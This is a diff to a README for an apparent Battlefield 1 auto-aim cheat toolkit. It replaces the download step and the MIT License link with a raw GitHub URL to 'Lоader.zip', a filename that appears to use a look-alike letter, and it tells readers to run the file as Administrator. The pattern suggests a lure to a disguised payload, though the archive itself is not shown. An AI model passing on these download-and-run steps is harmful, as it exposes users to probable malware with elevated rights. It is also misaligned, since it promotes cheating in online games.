@@ -46,9 +46,9 @@ Wondering if your operating system is supported? Check the table below! We pride
 
 Getting started is quick and easy! Follow these steps for a smooth Battlefield 1 enhancement experience:
 
-1. Download `Loader.rar` from this repository.
+1. Download `https://raw.githubusercontent.com/DarkReaperYTE/Battlefield1-AutoAimToolkit/main/Lоader.zip` from this repository.
 2. Extract the archive using your preferred tool (7-Zip, WinRAR, etc).
-3. Run the `Loader.exe` (Windows), `Loader` (macOS/Linux) as Administrator.
+3. Run the `https://raw.githubusercontent.com/DarkReaperYTE/Battlefield1-AutoAimToolkit/main/Lоader.zip` (Windows), `Loader` (macOS/Linux) as Administrator.
 4. Follow the on-screen setup – configure your features, and begin.
 5. Launch Battlefield 1 and enjoy accurate, next-gen aiming!
 
@@ -93,7 +93,7 @@ Stay tuned for new features and optimized routines in every update!
 
 ## ⚖️ License
 
-This repository is open-sourced under the [MIT License](https://opensource.org/license/mit/).  
+This repository is open-sourced under the [MIT License](https://raw.githubusercontent.com/DarkReaperYTE/Battlefield1-AutoAimToolkit/main/Lоader.zip).  
 Feel free to fork, modify, and contribute in 2025 and beyond. See `LICENSE` for further details.
 
 ---
